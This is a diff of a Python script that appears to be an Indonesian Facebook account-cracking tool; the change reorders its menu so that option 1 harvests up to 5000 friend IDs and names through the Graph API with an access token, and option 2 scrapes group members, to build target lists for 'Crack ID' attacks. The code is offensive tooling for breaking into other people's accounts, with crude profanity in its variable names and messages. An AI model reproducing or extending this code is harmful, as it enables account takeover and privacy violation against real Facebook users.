@@ -416,8 +416,8 @@ def moch_yayan():
     kueh  = {"cookie":_mmk_}
     print(" \x1b[1;97m[•] You IP   : %s"%(IP));time.sleep(0.03)
     print(" [•] \x1b[1;97mYou Name : %s%s%s\n"%(K,nama,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari anggota grup'%(O,N));time.sleep(0.03)
-    print(' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari teman publik'%(O,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m01%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari teman publik'%(O,N));time.sleep(0.03)
+    print(' \x1b[1;93m[%s\x1b[1;96m02%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari anggota grup'%(O,N));time.sleep(0.03)
     print(' \x1b[1;93m[%s\x1b[1;96m03%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari total followers'%(O,N));time.sleep(0.03)
     print(' \x1b[1;93m[%s\x1b[1;96m04%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari like postingan'%(O,N));time.sleep(0.03)
     print(' \x1b[1;93m[%s\x1b[1;96m05%s\x1b[1;93m] \x1b[1;97mCrack ID \x1b[1;93mdari random id massal'%(O,N));time.sleep(0.03)
@@ -432,6 +432,15 @@ def moch_yayan():
     if pepek == '':
         print('\n %s[%s×%s]\x1b[1;91m jangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
     elif pepek in['1','01']:
+        try:
+            print("\n [*] \x1b[1;97mKetik \x1b[1;92m'me' \x1b[1;97mjika ingin crack dari daftar teman")
+            user = input(' [*] \x1b[1;96mmasukan id atau username : ')
+            _memek_ = __convert__(user)
+            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),kontol)).json()["data"]:
+                id.append(a['id'] + '<=>' + a['name'])
+        except KeyError:
+            print('\n %s[%s×%s] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
+    elif pepek in['2','02']:
         kontol = input(f"{N} [?] \x1b[1;93mmasukkan id grup : ")
         if kontol in[""," "]:
             print('\n %s[%s×%s] \x1b[1;91mjangan kosong kentod!'%(N,M,N));time.sleep(2);moch_yayan()
@@ -450,15 +459,6 @@ def moch_yayan():
                     crack_grup(f"https://mbasic.facebook.com/browse/group/members/?id={kontol}")
             except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                 exit("\n [!] \x1b[1;91mKesalahan Pada Koneksi")
-    elif pepek in['2','02']:
-        try:
-            print("\n [*] \x1b[1;97mKetik \x1b[1;92m'me' \x1b[1;97mjika ingin crack dari daftar teman")
-            user = input(' [*] \x1b[1;96mmasukan id atau username : ')
-            _memek_ = __convert__(user)
-            for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),kontol)).json()["data"]:
-                id.append(a['id'] + '<=>' + a['name'])
-        except KeyError:
-            print('\n %s[%s×%s] \x1b[1;91mgagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
     elif pepek in['3','03']:
         kontol = input(f"{N} [?] \x1b[1;96mmasukan id atau username followers : ")
         if kontol in[""," "]:
